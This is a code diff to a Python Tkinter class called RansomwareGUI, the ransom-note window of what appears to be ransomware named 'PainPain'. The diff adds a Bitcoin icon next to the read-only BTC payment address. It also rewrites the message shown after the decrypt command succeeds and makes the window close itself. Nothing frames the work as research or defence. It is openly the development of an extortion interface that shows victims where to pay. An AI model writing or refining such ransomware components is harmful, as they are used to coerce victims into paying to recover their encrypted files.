@@ -70,10 +70,14 @@ class RansomwareGUI(tk.Tk):
 
         pay_label = tk.Label(self, text="💸 BTC PAYMENT ADDRESS", font=("Courier", 11, "bold"), fg="#ff0000", bg="#000000")
         pay_label.pack(pady=(20, 0))
-        pay_addr = tk.Entry(self, font=("Courier", 12), fg="#000000", bg="#eeeeee", width=50, justify="center")
+        pay_addr_frame = tk.Frame(self, bg="#000000")
+        pay_addr_frame.pack(pady=(0, 10))
+        pay_addr = tk.Entry(pay_addr_frame, font=("Courier", 12), fg="#000000", bg="#eeeeee", width=50, justify="center")
         pay_addr.insert(0, self.payment_address)
         pay_addr.config(state="readonly")
-        pay_addr.pack(pady=(0, 10))
+        pay_addr.pack(side="left")
+        btc_icon = tk.Label(pay_addr_frame, text="₿", font=("Courier", 18, "bold"), fg="#ff9900", bg="#000000")
+        btc_icon.pack(side="left", padx=(8, 0))
 
         entry_frame = tk.Frame(self, bg="#000000")
         entry_frame.pack(pady=(20, 10), padx=30, fill="x")
@@ -128,7 +132,8 @@ class RansomwareGUI(tk.Tk):
             try:
                 result = subprocess.run(self.decrypt_cmd, capture_output=True, text=True)
                 if result.returncode == 0:
-                    messagebox.showinfo("Success", "Files decrypted successfully!")
+                    messagebox.showinfo("Success", "PainPain Ransomware activity ended, your files are decrypted.\nThis window will close in 1 second.")
+                    self.after(1000, self.destroy)
                 else:
                     messagebox.showerror("Decryption Error", f"Decryption failed.\n\n{result.stderr}")
             except Exception as e:
